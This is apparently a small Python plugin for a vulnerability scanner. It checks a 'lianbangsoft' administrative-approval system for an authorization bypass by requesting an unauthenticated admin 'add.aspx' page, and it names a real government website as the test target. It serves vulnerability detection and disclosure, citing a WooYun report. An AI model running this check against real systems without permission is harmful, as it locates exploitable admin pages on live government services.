#!/usr/bin/env python
# -*- coding: utf-8 -*-
#行政审批系统一处系统越权
#refer:http://www.wooyun.org/bugs/wooyun-2010-0126218
#__author__ = 'xq17'

def assign(service, arg):
    if service == "lianbangsoft":
        return True, arg

def audit(arg):
    url = arg
    payload = 'workplate/xzsp/lbsxdict/add.aspx'
    verify_url = url +  payload
    code, head, res, errcode, _ = curl.curl2(verify_url)
    if code == 200 and 'btn_mouseover' in res:
        security_info(verify_url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('lianbangsoft','http://www.sdwlxzfw.gov.cn/')[1])